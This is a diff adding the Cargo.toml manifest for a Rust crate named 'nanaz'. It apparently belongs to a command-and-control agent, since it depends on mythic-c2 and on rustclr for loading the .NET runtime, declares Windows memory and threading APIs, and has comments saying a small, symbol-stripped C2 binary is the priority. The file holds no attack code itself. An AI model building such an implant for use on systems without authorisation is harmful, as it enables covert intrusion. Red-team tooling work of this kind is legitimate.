@@ -1,0 +1,38 @@
+[package]
+name = "nanaz"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+mythic-c2 = "0.2.1"
+serde = { version = "1.0.228", features = ["derive"] }
+uuid = { version = "1.23", features = ["serde", "v4"] }
+serde_json = "1.0.150"
+minreq = { version = "2.14.1", default-features = false, features = ["json-using-serde", "proxy", "https"] }
+rand = "0.8"
+chrono = { version = "0.4", default-features = false, features = ["clock"] }
+base64 = "0.22"
+encoding_rs = "0.8"
+
+[target.'cfg(unix)'.dependencies]
+libc = "0.2"
+
+[target.'cfg(windows)'.dependencies]
+windows-sys = { version = "0.59", features = ["Win32_Foundation", "Win32_System_Threading", "Win32_Security", "Win32_System_Memory", "Win32_System_SystemInformation", "Win32_NetworkManagement_IpHelper", "Win32_NetworkManagement_Ndis", "Win32_Networking_WinSock"] }
+rustclr = { git = "https://github.com/joaoviictorti/rustclr", rev = "9bdc8ef9bd0e7a6e4739a0b67d2c62d2933df90c" }
+
+[profile.dev]
+# Fast iteration: no LTO, default codegen-units, debug info ON.
+# The full release-like settings slow down rebuilds dramatically.
+opt-level = 0
+debug = true
+incremental = true
+
+[profile.release]
+opt-level = "z"        # Optimize for size — small C2 binary is the priority
+lto = "fat"            # Whole-program optimization, best size + perf
+codegen-units = 1      # Single codegen unit enables aggressive inlining
+panic = "abort"        # No unwind tables — small binary, panics terminate
+strip = "symbols"      # Strip symbol info from final binary
+debug = false
+incremental = false
